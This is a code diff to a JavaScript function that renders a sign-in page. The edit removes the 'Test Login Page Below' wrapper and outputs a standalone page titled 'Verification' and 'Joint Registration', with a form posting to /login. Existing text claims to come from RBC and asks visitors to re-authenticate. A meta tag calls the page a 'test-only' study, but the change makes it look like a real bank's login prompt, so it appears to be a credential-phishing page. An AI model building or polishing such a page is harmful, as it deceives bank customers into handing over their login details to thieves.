@@ -244,8 +244,25 @@ function renderPage({ content, title = "Test Login Page Below" }) {
 }
 
 function renderLoginPage() {
-  return renderPage({
-    content: `<section class="section-block" aria-labelledby="login-section-title">
+  return `<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Verification</title>
+    <meta name="description" content="A test-only mobile login UI study.">
+    <link rel="stylesheet" href="/styles.css">
+    <script src="/app.js" defer></script>
+  </head>
+  <body>
+  <a class="skip-link" href="#main">Skip to main content</a>
+    <main id="main" class="page-shell">
+      <section class="hero" aria-labelledby="page-title">
+        <h1 id="page-title">Joint Registration</h1>
+        <br>
+        <p class="eyebrow">Please follow on-screen directions.</p>
+      </section>
+  <section class="section-block" aria-labelledby="login-section-title">
         <h2 id="login-section-title">Sign In</h2>
         <form class="login-card" action="/login" method="post" data-login-form novalidate>
           <div class="field-row">
@@ -281,8 +298,10 @@ function renderLoginPage() {
             <p>Here at RBC we care about your security. Re-authenticating allows us to confirm it's really you.</p>
           </div>
         </div>
-      </section>`
-  });
+      </section>
+      </main>
+  </body>
+</html>`
 }
 
 function renderCompletePage() {
